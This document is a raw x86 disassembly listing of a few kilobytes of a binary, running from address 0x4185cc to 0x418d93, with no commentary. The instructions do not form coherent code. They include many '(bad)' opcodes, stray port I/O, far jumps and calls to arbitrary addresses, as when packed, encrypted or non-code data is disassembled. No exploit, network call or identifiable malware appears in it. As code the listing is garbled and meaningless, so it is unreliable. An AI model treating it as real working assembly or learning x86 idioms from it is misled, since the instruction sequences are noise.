  4185cc:	pop    esp
  4185cd:	retf   
  4185ce:	mov    ch,0x43
  4185d0:	lock bound esi,QWORD PTR [ecx+0xf2996c8]
  4185d7:	xchg   edi,eax
  4185d8:	ret    
  4185d9:	retf   0x7911
  4185dc:	adc    esp,DWORD PTR [eax]
  4185de:	mov    dh,0xa2
  4185e0:	cwd    
  4185e2:	cmp    ch,bl
  4185e4:	pop    esi
  4185e5:	cmp    al,0xbb
  4185e7:	jbe    0x418601
  4185e9:	dec    ebx
  4185ea:	pop    ecx
  4185eb:	int    0x74
  4185ed:	(bad)  
  4185ee:	mov    al,ds:0xe9ba7428
  4185f3:	mov    esi,edx
  4185f5:	test   BYTE PTR [ecx-0x63],dl
  4185f8:	add    eax,0x697e590
  4185fd:	fst    DWORD PTR [ebx+edx*8]
  418600:	call   FWORD PTR [esi+eiz*8-0x776e782d]
  418607:	push   es
  418608:	lods   al,BYTE PTR ds:[esi]
  418609:	dec    esi
  41860a:	cs inc ecx
  41860c:	dec    BYTE PTR [ebp+0x46]
  41860f:	fcom   DWORD PTR [ebp-0x43]
  418612:	arpl   WORD PTR [eax],di
  418614:	xor    cl,ah
  418616:	ror    edx,1
  418618:	mov    edx,0xd4cccdc9
  41861d:	(bad)  es:[edx+0x66ba478b]
  418624:	mov    es,WORD PTR [esi+edi*1-0x10fe167a]
  41862b:	adc    BYTE PTR [edi-0x72ab5e1f],ah
  418631:	inc    ecx
  418632:	cmp    al,0x1
  418634:	or     ecx,ecx
  418636:	stos   DWORD PTR es:[edi],eax
  418637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418638:	loopne 0x418672
  41863a:	sub    eax,0xf3dc4402
  41863f:	push   edi
  418640:	lock into 
  418642:	fst    DWORD PTR [ecx]
  418644:	pusha  
  418645:	cs pop ebp
  418647:	call   0xe7d0dcee
  41864c:	lods   eax,DWORD PTR ds:[esi]
  41864d:	mov    bl,BYTE PTR [ecx-0x45]
  418650:	pusha  
  418651:	cmp    BYTE PTR [eax-0x70],cl
  418654:	std    
  418655:	jg     0x41864f
  418657:	jmp    0x603c168e
  41865c:	and    esp,edi
  41865e:	inc    ecx
  41865f:	jnp    0x4185f1
  418661:	in     eax,0x8
  418663:	cmp    al,0x4f
  418665:	or     DWORD PTR [esi],ecx
  418667:	stos   BYTE PTR es:[edi],al
  418668:	call   0x13a11e1d
  41866d:	(bad)  
  41866e:	clc    
  41866f:	mov    eax,ds:0xf3f42512
  418674:	push   0x21e24a66
  418679:	mov    ss,edx
  41867b:	pushf  
  41867c:	adc    DWORD PTR [eax+ebp*8+0x19],eax
  418680:	loop   0x4186b4
  418682:	xlat   BYTE PTR ds:[ebx]
  418683:	pop    edx
  418684:	popa   
  418685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418686:	pop    esp
  418687:	ror    BYTE PTR [edx],cl
  418689:	inc    ebx
  41868a:	bound  ebp,QWORD PTR [ecx-0x2]
  41868d:	mov    al,0x4e
  41868f:	aam    0xcb
  418691:	mov    esp,0x815fb093
  418696:	dec    DWORD PTR [ecx]
  418698:	add    al,0xc5
  41869a:	das    
  41869b:	pop    esi
  41869c:	push   esp
  41869d:	call   0xa8924f89
  4186a2:	pop    edi
  4186a3:	push   es
  4186a4:	int3   
  4186a5:	popf   
  4186a6:	jmp    0x418640
  4186a8:	lods   al,BYTE PTR ds:[esi]
  4186a9:	and    ebp,edx
  4186ab:	add    al,0x39
  4186ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ae:	push   ebx
  4186af:	lea    ecx,[eax+0x35aac49b]
  4186b5:	add    dl,BYTE PTR [edx+0x4c]
  4186b8:	loope  0x41866c
  4186ba:	push   edx
  4186bb:	fiadd  DWORD PTR [ecx-0x11]
  4186be:	sti    
  4186bf:	add    al,0xf
  4186c1:	or     eax,0xdfa29f9d
  4186c6:	push   0x5322964b
  4186cb:	jns    0x41866e
  4186cd:	add    bh,BYTE PTR [ebx]
  4186cf:	sub    DWORD PTR [ebp+0x38],edi
  4186d2:	ficomp DWORD PTR [ebp-0x4e]
  4186d5:	xor    BYTE PTR [edi],0x39
  4186d8:	add    bl,dl
  4186da:	or     esp,ebp
  4186dc:	in     al,0x64
  4186de:	imul   ecx,DWORD PTR [ecx-0x20],0xaaca9192
  4186e5:	inc    edi
  4186e6:	and    ebp,DWORD PTR [esi+0x3c]
  4186e9:	fidivr DWORD PTR [ebp-0x19d58c62]
  4186ef:	test   eax,0xea8fce80
  4186f4:	cs addr16 dec ebx
  4186f7:	inc    ebp
  4186f8:	sar    DWORD PTR [ebp+0x7c1b6bfa],1
  4186fe:	fmulp  st(2),st
  418700:	inc    ebx
  418701:	retf   
  418702:	in     eax,dx
  418703:	sbb    DWORD PTR [eax],eax
  418705:	and    ebp,edx
  418707:	adc    esi,eax
  418709:	(bad)
  41870c:	ds cmp ebp,esp
  41870f:	je     0x418701
  418711:	cmp    esp,ecx
  418713:	mov    ebp,0xc5a34f46
  418718:	cmp    DWORD PTR ds:0xf0324b1b,edx
  41871e:	sahf   
  41871f:	jg     0x4186d5
  418721:	cmp    ah,BYTE PTR [edi+0x226ee7d4]
  418727:	(bad)  
  418728:	push   esi
  418729:	imul   ecx,DWORD PTR [ebx+esi*1-0x13],0x78d0d45d
  418731:	imul   edi,DWORD PTR [esi],0xf05f5ee1
  418737:	jno    0x4186d7
  418739:	std    
  41873a:	pushf  
  41873b:	sub    dl,BYTE PTR [edi+0x1942bb50]
  418741:	sub    eax,0xde90e6a9
  418746:	aam    0x7c
  418748:	fcomi  st,st(4)
  41874a:	mov    BYTE PTR [esi+eax*4+0x6dc8f14a],al
  418751:	sbb    ebp,DWORD PTR [ebx+eiz*4+0x64]
  418755:	shl    ebx,0x35
  418758:	(bad)  
  418759:	xchg   ebp,eax
  41875a:	sub    edi,DWORD PTR [edx+0x31]
  41875d:	pop    ss
  41875e:	call   0xce5e1e0b
  418763:	mov    al,ds:0xc6df272d
  418768:	sub    BYTE PTR [edx-0x6a821a06],cl
  41876e:	push   ebx
  41876f:	data16 mov al,ds:0x77dcee5a
  418775:	jl     0x4187ee
  418777:	call   0x213aa066
  41877c:	adc    edx,DWORD PTR [esi+0x29]
  41877f:	or     DWORD PTR [edi-0x3d],edx
  418782:	ins    BYTE PTR es:[edi],dx
  418783:	inc    eax
  418784:	push   0xb81c4ab3
  418789:	push   0xffffffb5
  41878b:	push   edi
  41878c:	stc    
  41878d:	popa   
  41878e:	mov    dl,0xb1
  418790:	jno    0x4187ed
  418792:	push   cs
  418793:	in     eax,dx
  418794:	dec    ebx
  418795:	jmp    0xbacd:0x83410313
  41879c:	xchg   esp,eax
  41879d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41879e:	push   cs
  41879f:	(bad)  
  4187a0:	jmp    0x41880b
  4187a2:	(bad)  
  4187a3:	rcr    dl,cl
  4187a5:	mov    ss,WORD PTR [edx]
  4187a7:	xor    BYTE PTR [ebx+0x51],bh
  4187aa:	mov    dl,0x8f
  4187ac:	cmp    ah,BYTE PTR [ebx-0xd]
  4187af:	mov    ah,0xd2
  4187b1:	aad    0x60
  4187b3:	xchg   ebp,eax
  4187b4:	jge    0x41880f
  4187b6:	xchg   ecx,eax
  4187b7:	jbe    0x4187da
  4187b9:	clc    
  4187ba:	push   ebx
  4187bb:	dec    ecx
  4187bc:	mov    edi,0x3f64d897
  4187c1:	sub    BYTE PTR [eax+0xdda9120],bl
  4187c7:	push   edx
  4187c8:	retf   
  4187c9:	(bad)  
  4187ca:	jle    0x4187ff
  4187cc:	jns    0x41877d
  4187ce:	mov    ah,0x66
  4187d0:	jl     0x418835
  4187d2:	push   0xffffffe0
  4187d4:	mov    BYTE PTR [ecx+0xb],cl
  4187d7:	popa   
  4187d8:	shl    DWORD PTR [esi],0xbf
  4187db:	fstp   QWORD PTR [esi+0x2e09b78f]
  4187e1:	mov    esi,0xf94d5040
  4187e6:	ret    0x12ed
  4187e9:	or     ch,BYTE PTR [edx-0x5ce0aacf]
  4187ef:	pop    edx
  4187f0:	out    0x17,eax
  4187f2:	aas    
  4187f3:	mov    BYTE PTR [esi-0x727a19b8],0xa1
  4187fa:	jp     0x4187ef
  4187fc:	ja     0x41880e
  4187fe:	cmp    ebx,DWORD PTR [eax+edi*2]
  418801:	dec    ebx
  418802:	je     0x418829
  418804:	mov    eax,ds:0x7ec3eb31
  418809:	mov    ebx,0xbc7c858b
  41880e:	mov    dh,0xea
  418810:	jo     0x418854
  418812:	push   esi
  418813:	fldenv [edx]
  418815:	sbb    ah,0x2c
  418818:	dec    eax
  418819:	loope  0x418811
  41881b:	jb     0x418851
  41881d:	xor    cl,bh
  41881f:	push   ecx
  418820:	jmp    0x7d2:0x33db9593
  418827:	repnz mov bh,0x94
  41882a:	mov    ebx,0xbca1c35a
  41882f:	or     eax,0xee56eca1
  418834:	add    eax,0xa54a53d7
  418839:	(bad)  
  41883b:	sbb    eax,0x32f47cdf
  418840:	int    0xd0
  418842:	inc    ecx
  418843:	out    dx,eax
  418844:	test   BYTE PTR [edi+0x19],0xf5
  418848:	ins    DWORD PTR es:[edi],dx
  418849:	sti    
  41884a:	stos   BYTE PTR es:[edi],al
  41884b:	hlt    
  41884c:	dec    edi
  41884d:	mov    esp,0x41d2bf93
  418852:	mov    al,0xa
  418854:	pop    edi
  418855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418856:	div    DWORD PTR ds:0x1092d4b0
  41885c:	jmp    0xe2d33422
  418861:	fnsave [edx]
  418863:	rcr    DWORD PTR [ecx],cl
  418865:	mov    ss,WORD PTR [esi+ebx*2-0x76]
  418869:	push   ebx
  41886a:	adc    bh,ch
  41886c:	mov    ?,WORD PTR [edx+0x7f571ba3]
  418872:	repnz test BYTE PTR [ebx-0x20],al
  418876:	inc    eax
  418877:	push   cs
  418878:	imul   edx,DWORD PTR [edx],0xffffffc0
  41887b:	xchg   DWORD PTR [bx+si],ebp
  41887e:	and    BYTE PTR [edx],dh
  418880:	pop    ss
  418881:	dec    esp
  418882:	mov    ebx,0xe88cfb46
  418887:	mov    WORD PTR [edi+0x76316911],cs
  41888d:	cmp    dh,BYTE PTR [ecx+0x32424822]
  418893:	aaa    
  418894:	jmp    0x30f0:0x6c623465
  41889b:	pushf  
  41889c:	rcr    BYTE PTR [edx],cl
  41889e:	mov    bl,0xa3
  4188a0:	inc    ebp
  4188a1:	outs   dx,DWORD PTR ds:[esi]
  4188a2:	sar    BYTE PTR [ecx-0x79],0xed
  4188a6:	dec    edi
  4188a7:	or     bl,BYTE PTR [edi-0x6b13895f]
  4188ad:	pop    edx
  4188ae:	adc    BYTE PTR [edi-0x165f8b99],dl
  4188b4:	popa   
  4188b5:	dec    edi
  4188b6:	sub    eax,0xa5918b37
  4188bb:	jmp    0xbffe:0xad24315
  4188c2:	shr    DWORD PTR [ebx-0xa],0x38
  4188c6:	mov    cl,0xa7
  4188c8:	shl    DWORD PTR ds:0xdcdc3bed,0x69
  4188cf:	mov    bl,0x4d
  4188d1:	imul   edx,DWORD PTR [eax],0xffffffc3
  4188d4:	xchg   ebp,eax
  4188d5:	xchg   DWORD PTR [edx+0x14],ecx
  4188d8:	xor    cl,BYTE PTR [edx+eiz*1+0x3a]
  4188dc:	fmul   DWORD PTR ds:0xcf583392
  4188e2:	push   0x24bb3dfb
  4188e7:	dec    edx
  4188e8:	data16 or BYTE PTR [esi+edi*1+0x5aa60098],0xbc
  4188f1:	inc    ebx
  4188f2:	scas   eax,DWORD PTR es:[edi]
  4188f3:	cli    
  4188f4:	sar    DWORD PTR ds:0x143680e1,0x5b
  4188fb:	jecxz  0x418898
  4188fd:	jae    0x41892b
  4188ff:	pop    eax
  418900:	scas   al,BYTE PTR es:[edi]
  418901:	sbb    ecx,ebx
  418903:	hlt    
  418904:	push   0xe71999bd
  418909:	iret   
  41890a:	call   DWORD PTR [esi]
  41890c:	sbb    al,0x45
  41890e:	sub    ch,BYTE PTR [ebp+esi*1+0x32]
  418912:	es inc esp
  418914:	pop    ds
  418915:	dec    ecx
  418916:	xchg   DWORD PTR [eax],esp
  418918:	xchg   edi,eax
  418919:	jmp    0xa6d6:0x7f971720
  418920:	mov    ebp,0xb3ce494a
  418925:	and    DWORD PTR [esi+0x2651c102],ecx
  41892b:	xchg   ebx,eax
  41892c:	pop    eax
  41892d:	fstp   QWORD PTR [ecx+ebp*4-0x273112ad]
  418934:	mov    al,0x8c
  418936:	gs push cs
  418938:	sub    eax,DWORD PTR [ebp-0x1edc2b5c]
  41893e:	and    BYTE PTR ds:0x45f6bb74,dl
  418944:	je     0x41898d
  418946:	pop    esi
  418947:	mov    al,dl
  418949:	mov    esi,0x18cce4ba
  41894e:	je     0x41898d
  418950:	xchg   ecx,eax
  418951:	sbb    al,0x81
  418953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418954:	js     0x418907
  418956:	cdq    
  418957:	into   
  418958:	cdq    
  418959:	inc    ecx
  41895a:	(bad)  [edx-0x7e]
  41895d:	fwait
  41895e:	or     DWORD PTR [edx+edx*1+0xaeaa116],ebp
  418965:	sbb    dh,BYTE PTR [esi+0x3ef7702b]
  41896b:	sbb    dl,BYTE PTR [ebp+0x4c0482b]
  418971:	inc    ebp
  418972:	imul   ecx,DWORD PTR [eax],0xffffffeb
  418975:	bound  esp,QWORD PTR [esi+0x66]
  418978:	fdivr  QWORD PTR [ecx+0x1c58ceb7]
  41897e:	pop    es
  41897f:	lods   eax,DWORD PTR ds:[esi]
  418980:	sub    DWORD PTR [eax-0x6384ff85],ecx
  418986:	sub    ecx,DWORD PTR [ebx-0x2fc7790a]
  41898c:	and    ebp,DWORD PTR [esi+0x275d4ceb]
  418992:	iret   
  418993:	retf   0xcfd9
  418996:	mov    fs,WORD PTR [edi+0x66]
  418999:	xor    dh,0xce
  41899c:	fcos   
  41899e:	pop    ds
  41899f:	mov    bl,0x1d
  4189a1:	sub    bh,BYTE PTR [esi+0x2]
  4189a4:	fstp   TBYTE PTR [edi]
  4189a6:	sub    eax,0x3dbacb0
  4189ab:	jg     0x41893d
  4189ad:	mul    DWORD PTR [edx+0x42]
  4189b0:	xlat   BYTE PTR ds:[ebx]
  4189b1:	out    0x5f,al
  4189b3:	inc    ecx
  4189b4:	inc    eax
  4189b5:	test   DWORD PTR [ebp-0x34],eax
  4189b8:	mov    esi,eax
  4189ba:	enter  0x7126,0x75
  4189be:	leave  
  4189bf:	popa   
  4189c0:	mov    ah,0xd9
  4189c2:	jle    0x4189f1
  4189c4:	fnsave [ebx]
  4189c6:	cmc    
  4189c7:	daa    
  4189c8:	stos   BYTE PTR es:[edi],al
  4189c9:	arpl   WORD PTR [ebx],bp
  4189cb:	jg     0x418956
  4189cd:	xchg   edx,eax
  4189ce:	mov    ebx,DWORD PTR [edx+0x5b382d24]
  4189d4:	repz mov ah,BYTE PTR [esi]
  4189d7:	xchg   ebx,eax
  4189d8:	xor    dh,BYTE PTR [ebx+0x728457ec]
  4189de:	in     eax,dx
  4189df:	push   cs
  4189e0:	rol    BYTE PTR [esi+ebp*8+0x62],1
  4189e4:	cmp    BYTE PTR [ecx+0x33],0xfe
  4189e8:	retf   0x4f0f
  4189eb:	data16 adc cl,dh
  4189ee:	aam    0x60
  4189f0:	jle    0x41897d
  4189f2:	jecxz  0x418983
  4189f4:	addr16 xchg ecx,eax
  4189f6:	mov    eax,0x5c390721
  4189fb:	and    eax,0x5356d057
  418a00:	mov    ebx,0x30e4cb93
  418a05:	enter  0x6822,0xf1
  418a09:	out    0xf8,eax
  418a0b:	arpl   WORD PTR [ebx],si
  418a0d:	imul   ebx,DWORD PTR [ebp-0x738c6231],0xca052d7c
  418a17:	or     DWORD PTR [ebx],ecx
  418a19:	jg     0x418a01
  418a1b:	mov    edi,0xf1dce52a
  418a20:	mov    bl,0x31
  418a22:	fst    QWORD PTR [edi+esi*8]
  418a25:	or     DWORD PTR [eax-0x4d],ecx
  418a28:	jnp    0x418a50
  418a2a:	lock push esi
  418a2c:	aaa    
  418a2d:	dec    DWORD PTR [edi-0x80]
  418a30:	ret    
  418a31:	icebp  
  418a32:	mov    ebp,0x5b82a069
  418a37:	sub    BYTE PTR [ecx],ch
  418a39:	cmc    
  418a3a:	adc    BYTE PTR [edi],ch
  418a3c:	inc    ebx
  418a3d:	mov    ch,0x68
  418a3f:	mov    al,BYTE PTR [ebx+0x3]
  418a42:	push   edi
  418a43:	jle    0x4189c7
  418a45:	out    dx,eax
  418a46:	in     al,dx
  418a47:	sub    esi,DWORD PTR [bx+si-0x3f52]
  418a4c:	js     0x418a1b
  418a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a4f:	push   ebp
  418a50:	leave  
  418a51:	adc    BYTE PTR [ebx],dl
  418a53:	pop    edi
  418a54:	ins    BYTE PTR es:[edi],dx
  418a55:	call   0x3af4432d
  418a5a:	test   edi,edx
  418a5c:	jmp    0x187e22ea
  418a61:	sbb    DWORD PTR [esp+eax*4],ecx
  418a64:	loopne 0x418acf
  418a66:	sub    edx,ebp
  418a68:	add    esi,DWORD PTR [ecx-0x77]
  418a6b:	pop    ecx
  418a6c:	sar    edi,cl
  418a6e:	mov    bh,0x9b
  418a70:	sbb    eax,0xd16d5a87
  418a75:	(bad)  
  418a76:	xchg   esi,eax
  418a77:	jmp    0xf6f:0x34e3c3bc
  418a7e:	xlat   BYTE PTR ds:[ebx]
  418a7f:	(bad)  
  418a80:	pop    ss
  418a81:	in     al,dx
  418a82:	imul   esp,esi,0xe16c4bd8
  418a88:	cmp    eax,0x98f5f113
  418a8d:	pop    ebx
  418a8e:	or     DWORD PTR [edx+0x6d],ebx
  418a91:	jmp    DWORD PTR [ebx-0x5e1160a7]
  418a97:	and    BYTE PTR [edi+eiz*1-0x152567a9],bh
  418a9e:	es shr eax,cl
  418aa1:	mov    bh,0xf4
  418aa3:	rol    DWORD PTR [ecx-0x4f],0x76
  418aa7:	pushf  
  418aa8:	shl    BYTE PTR [ebx+0x76],0x2d
  418aac:	cmp    BYTE PTR ds:0x37bbe984,ah
  418ab2:	dec    BYTE PTR [edx+0x6]
  418ab5:	inc    ecx
  418ab6:	fsub   QWORD PTR [ecx]
  418ab8:	sub    BYTE PTR [edx-0x411fd07e],ah
  418abe:	jbe    0x418b2d
  418ac0:	push   0xcf6c9c2a
  418ac5:	mov    cl,0xa9
  418ac7:	repnz push ss
  418ac9:	sti    
  418aca:	mov    ds:0x9db9ab3f,eax
  418acf:	jecxz  0x418ad8
  418ad1:	ficom  WORD PTR [edx+0x7f344dc3]
  418ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad8:	adc    eax,0x86c3c792
  418add:	push   0x11ff98f0
  418ae2:	dec    edi
  418ae3:	fwait
  418ae4:	jbe    0x418ac4
  418ae6:	dec    esi
  418ae7:	xchg   edx,eax
  418ae8:	test   BYTE PTR [esi-0x49],0x76
  418aec:	cmp    ebp,DWORD PTR [eax+0x64]
  418aef:	xor    BYTE PTR [esi],dh
  418af1:	and    DWORD PTR [esi-0x6e8510e2],eax
  418af7:	sub    ch,BYTE PTR [edx+0x71]
  418afa:	xchg   BYTE PTR ds:0xb4110a0,dh
  418b00:	dec    ebx
  418b01:	xor    dh,BYTE PTR [ebx]
  418b03:	dec    edi
  418b04:	jno    0x418b31
  418b06:	sahf   
  418b07:	stos   DWORD PTR es:[edi],eax
  418b08:	adc    BYTE PTR [eax],0xa0
  418b0b:	fstp   TBYTE PTR gs:[edi]
  418b0e:	aaa    
  418b0f:	inc    ecx
  418b10:	into   
  418b11:	out    0x33,al
  418b13:	jo     0x418b78
  418b15:	sub    DWORD PTR [ebp+0x439a26f],edx
  418b1b:	xchg   ecx,eax
  418b1c:	jmp    0x418ae6
  418b1e:	sbb    al,0xe2
  418b20:	test   ah,bl
  418b22:	xchg   ecx,eax
  418b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b24:	and    ch,dh
  418b26:	int3   
  418b27:	dec    edi
  418b28:	jbe    0x418aaa
  418b2a:	add    bl,BYTE PTR cs:[esi+0xc]
  418b2e:	or     al,BYTE PTR [ecx+0x8]
  418b31:	and    BYTE PTR [ebx+0x6dcb7762],bh
  418b37:	mov    edi,DWORD PTR [ecx]
  418b39:	pop    esi
  418b3a:	popa   
  418b3b:	sub    al,0x9e
  418b3d:	adc    al,0x58
  418b3f:	aad    0x7b
  418b41:	xchg   ebx,eax
  418b42:	mov    ah,0x35
  418b44:	add    eax,DWORD PTR [eax-0x52]
  418b47:	arpl   WORD PTR [ebx-0x5adac8b3],si
  418b4d:	jecxz  0x418b8e
  418b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b50:	sub    al,0xe1
  418b52:	sbb    al,0x53
  418b54:	dec    edx
  418b55:	mov    es,WORD PTR [ecx]
  418b57:	in     eax,dx
  418b58:	data16 jle 0x418b2c
  418b5b:	pop    ss
  418b5c:	adc    DWORD PTR [edx-0x49ad8361],edi
  418b62:	cwde   
  418b63:	dec    esi
  418b64:	sbb    bh,cl
  418b66:	scas   al,BYTE PTR es:[edi]
  418b67:	lds    edx,FWORD PTR [ecx]
  418b69:	adc    esp,DWORD PTR [ecx]
  418b6b:	xlat   BYTE PTR ds:[ebx]
  418b6c:	adc    DWORD PTR [edx+0x12],ecx
  418b6f:	xchg   esi,eax
  418b70:	jbe    0x418b7b
  418b72:	sbb    bh,BYTE PTR [ebx]
  418b74:	xchg   bh,dh
  418b76:	es out 0xaa,eax
  418b79:	mov    dh,0x65
  418b7b:	inc    ebp
  418b7c:	add    al,BYTE PTR [edi+0x48255afb]
  418b82:	in     al,0x48
  418b84:	sbb    cl,dl
  418b86:	cdq    
  418b87:	repnz lea eax,[edx-0x27]
  418b8b:	add    eax,0xff99d43f
  418b90:	aad    0x26
  418b92:	clc    
  418b93:	mov    al,0x34
  418b95:	in     al,0x48
  418b97:	xor    DWORD PTR [edi-0x44],eax
  418b9a:	sbb    eax,0xffc4ab36
  418b9f:	aad    0xfa
  418ba1:	dec    edx
  418ba2:	add    al,cl
  418ba4:	sub    ah,0x55
  418ba7:	dec    dl
  418ba9:	outs   dx,DWORD PTR ds:[esi]
  418baa:	int    0x2a
  418bac:	pop    ds
  418bad:	and    DWORD PTR [eax-0x5432d309],esp
  418bb3:	xor    DWORD PTR [ecx],edi
  418bb5:	jmp    0x3d88:0xf315792e
  418bbc:	and    eax,0xffffff89
  418bbf:	mov    ds:0x372a68db,eax
  418bc4:	cmp    dl,al
  418bc6:	es xchg esp,eax
  418bc8:	cmp    BYTE PTR [esi+0x61a846ad],0xcf
  418bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd0:	xchg   ebx,eax
  418bd1:	out    0xd3,al
  418bd3:	aad    0xe7
  418bd5:	mov    ecx,0x80ede288
  418bda:	outs   dx,DWORD PTR ds:[esi]
  418bdb:	or     dl,BYTE PTR [edi-0x32418c51]
  418be1:	mov    ch,0x56
  418be3:	lock pop es
  418be5:	sub    esp,edi
  418be7:	and    dl,BYTE PTR [edi]
  418be9:	fmul   st,st(5)
  418beb:	sbb    bl,bh
  418bed:	lea    edi,[eax+0x2655ea02]
  418bf3:	ja     0x418b9c
  418bf5:	pop    esi
  418bf6:	(bad)  
  418bf7:	xor    BYTE PTR [esi],ah
  418bf9:	and    BYTE PTR [ecx+0x34e3d9fc],cl
  418bff:	or     BYTE PTR [ebp+0x3afa65b0],bl
  418c05:	adc    eax,0xa12968ec
  418c0a:	push   ss
  418c0b:	xor    al,0x2e
  418c0d:	xchg   esp,eax
  418c0e:	mov    DWORD PTR [ebx-0x58ef8f15],esp
  418c14:	fisub  DWORD PTR ds:0xdb2c7be0
  418c1a:	dec    edx
  418c1b:	cwde   
  418c1c:	bound  edx,QWORD PTR [edi+0x71]
  418c1f:	cmp    eax,0xd035431a
  418c24:	mov    esi,0xa02da3a2
  418c29:	mov    ebx,0xb8c0fd23
  418c2e:	sbb    ebx,ebx
  418c30:	xlat   BYTE PTR ds:[ebx]
  418c31:	xor    eax,0xbba5bb55
  418c36:	xchg   ecx,eax
  418c37:	adc    cl,bl
  418c39:	test   al,0x7d
  418c3b:	adc    DWORD PTR [esi-0x46],esp
  418c3e:	inc    edi
  418c3f:	mov    eax,ds:0xa99623b6
  418c44:	mov    ch,0x5e
  418c46:	inc    ecx
  418c47:	cmp    ebp,DWORD PTR [esi+ebp*4+0x2f]
  418c4b:	add    ah,BYTE PTR [edx]
  418c4d:	test   eax,0x35b8621c
  418c52:	shr    DWORD PTR [edi+0x61894845],0xd9
  418c59:	iret   
  418c5a:	retf   0x7c2
  418c5d:	outs   dx,BYTE PTR ds:[esi]
  418c5e:	ficom  WORD PTR [esi+0x1ee3375e]
  418c64:	ficom  WORD PTR [edi-0x401145f8]
  418c6a:	sbb    ch,BYTE PTR [ecx+0xb]
  418c6d:	mov    ebx,0x666ea52d
  418c72:	xchg   edx,eax
  418c73:	pushf  
  418c74:	xchg   ecx,eax
  418c75:	test   BYTE PTR [edx-0x2e],bh
  418c78:	mov    WORD PTR [esi+0x39],fs
  418c7b:	and    al,0x7c
  418c7d:	(bad)  
  418c7e:	jp     0x418ce6
  418c80:	push   ebp
  418c81:	xchg   ecx,eax
  418c82:	cmp    al,0xd0
  418c84:	hlt    
  418c85:	or     bl,BYTE PTR [ecx-0x1e]
  418c88:	xor    al,0x15
  418c8a:	xchg   ebp,eax
  418c8b:	mov    dh,0x60
  418c8d:	adc    edi,DWORD PTR [eax-0x6a]
  418c90:	pop    ds
  418c91:	lods   al,BYTE PTR ds:[esi]
  418c92:	shr    BYTE PTR [eax+eax*4+0x3a],0x5
  418c97:	jmp    0xefcd7908
  418c9c:	add    edi,DWORD PTR [edx-0x7304459]
  418ca2:	mov    ebp,0x123b8168
  418ca7:	pop    edi
  418ca8:	pop    edx
  418ca9:	fld    QWORD PTR [edx]
  418cab:	clc    
  418cac:	pop    edx
  418cad:	add    BYTE PTR [edx],bl
  418caf:	xor    al,0xa
  418cb1:	dec    ebp
  418cb2:	sbb    eax,0xdcca8713
  418cb7:	repz int3 
  418cb9:	test   al,0x81
  418cbb:	add    DWORD PTR [bp+0x4],esp
  418cbf:	retf   0xc8bd
  418cc2:	fnstsw WORD PTR [eax-0x191b6d8b]
  418cc8:	(bad)  
  418cc9:	clc    
  418cca:	or     esi,DWORD PTR [eax-0x5643792d]
  418cd0:	jmp    0x4c8fdd80
  418cd5:	cmc    
  418cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cd7:	pop    es
  418cd8:	lds    esi,FWORD PTR ds:0x332b01e8
  418cde:	pop    ebx
  418cdf:	lock fadd DWORD PTR [eax+0x194694f4]
  418ce6:	mov    ch,0x3
  418ce8:	aam    0x93
  418cea:	sub    al,0x95
  418cec:	sub    BYTE PTR [esi+0xe],bl
  418cef:	adc    BYTE PTR [ebx+0x36d5685d],dl
  418cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cf6:	stos   DWORD PTR es:[edi],eax
  418cf7:	xchg   ebx,eax
  418cf8:	inc    esi
  418cf9:	pop    es
  418cfa:	mov    ss,esp
  418cfc:	jg     0x418cf4
  418cfe:	or     dl,bl
  418d00:	ss jp  0x418cc0
  418d03:	add    dh,dl
  418d05:	mov    bh,0xd2
  418d07:	sbb    al,0x5
  418d09:	xchg   ebx,eax
  418d0a:	lds    edi,FWORD PTR [ecx+0x4a]
  418d0d:	out    0xba,al
  418d0f:	(bad)  
  418d10:	sub    BYTE PTR [ecx],dl
  418d12:	mov    ah,0xd6
  418d14:	psllq  mm1,QWORD PTR [ecx+edx*2]
  418d18:	sti    
  418d19:	clc    
  418d1a:	xchg   DWORD PTR [ebp-0x4ab70994],eax
  418d20:	popa   
  418d21:	jne    0x418cb4
  418d23:	inc    edi
  418d24:	push   edx
  418d25:	fiadd  WORD PTR [eax+eiz*4-0x67]
  418d29:	inc    edi
  418d2a:	inc    ebx
  418d2b:	push   edi
  418d2c:	xlat   BYTE PTR ds:[ebx]
  418d2d:	dec    ebp
  418d2e:	popf   
  418d2f:	cmp    BYTE PTR [ebp-0x6e00c826],ch
  418d35:	rep ins DWORD PTR es:[edi],dx
  418d37:	dec    ebx
  418d38:	inc    edi
  418d39:	dec    ebx
  418d3a:	sar    cl,1
  418d3c:	push   cs
  418d3d:	repz dec eax
  418d3f:	sbb    DWORD PTR [edx],ebp
  418d41:	in     al,0xee
  418d43:	add    eax,0xf9b2de68
  418d48:	stos   DWORD PTR es:[edi],eax
  418d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d4a:	push   esi
  418d4b:	enter  0x5abf,0x79
  418d4f:	(bad)  
  418d50:	fld    DWORD PTR [ebx+0x4a569c8c]
  418d56:	inc    ecx
  418d57:	ins    DWORD PTR es:[edi],dx
  418d58:	fmul   st,st(7)
  418d5a:	cmp    al,0x54
  418d5c:	stos   BYTE PTR es:[edi],al
  418d5d:	imul   esi,DWORD PTR [eax],0x76a26ef4
  418d63:	mov    bh,0x1
  418d65:	call   0xd45d:0xe73816dc
  418d6c:	xor    eax,0x9bb2611a
  418d71:	jl     0x418d41
  418d73:	mov    dl,0x6a
  418d75:	repnz es mov esp,0xe4f081e5
  418d7c:	dec    eax
  418d7d:	cmp    BYTE PTR [ecx-0x55],bl
  418d80:	mov    dl,0xed
  418d82:	inc    ebp
  418d83:	mov    eax,0x95944383
  418d88:	sub    al,BYTE PTR [ecx-0x1c]
  418d8b:	and    cl,BYTE PTR [esi]
  418d8d:	push   ss
  418d8e:	loope  0x418d69
  418d90:	xchg   ebx,eax
  418d91:	ss push eax
  418d93:	sub    eax,0xea5be069
